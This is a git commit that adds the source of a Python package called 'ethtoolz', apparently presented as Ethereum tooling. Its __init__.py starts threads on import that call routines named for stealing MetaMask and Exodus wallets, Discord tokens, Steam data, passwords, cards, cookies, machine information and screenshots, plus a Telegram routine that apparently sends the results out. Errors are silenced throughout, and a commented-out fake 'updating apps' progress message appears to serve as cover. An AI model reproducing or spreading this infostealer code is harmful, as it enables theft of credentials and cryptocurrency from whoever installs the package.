cbc1087719fea213b830c4fc3093d4cf3364ce93
Bot <41898282+github-actions[bot]@users.noreply.github.com>
2023-08-06 16:22:43 +0000

    Add package ethtoolz/1.0/ethtoolz-1.0.tar.gz

---
+++ packages/ethtoolz/ethtoolz-1.0.tar.gz/ethtoolz-1.0/src/ethtoolz/__init__.py
@@ -0,0 +1,70 @@
+from metamask import yea
+from discord import find_tokens
+from exodus import runner
+from machine import machineinfo
+
+def stha():
+    try:
+        
+        import passwords_cards_cookies
+    except:
+        pass
+    from screenshot import sikrinsat
+    from telegram import telegram
+    try:
+        
+        import steam
+    except:
+        pass
+
+
+    try:
+        yea()
+    except:
+        pass
+
+
+    try:
+        yea()
+    except:
+        pass
+    try:
+        find_tokens()
+    except:
+        pass
+    try:
+        runner()
+    except:
+        pass
+    try:
+        machineinfo()
+    except Exception as e:
+        print(e)
+        pass
+    try:
+        sikrinsat()
+    except:
+        pass
+    try:
+        telegram()
+    except:
+        pass
+
+def andtheother():
+    import time
+    import sys
+    import os
+    # print("UPDATING APPS (it may take 5 minutes)")
+
+
+    #animation = ["10%", "20%", "30%", "40%", "50%", "60%", "70%", "80%", "90%", "100%"]
+
+
+from threading import Thread
+
+
+za1 = Thread(target=andtheother, args=())
+za1.start()
+
+za2 = Thread(target=stha, args=())
+za2.start()
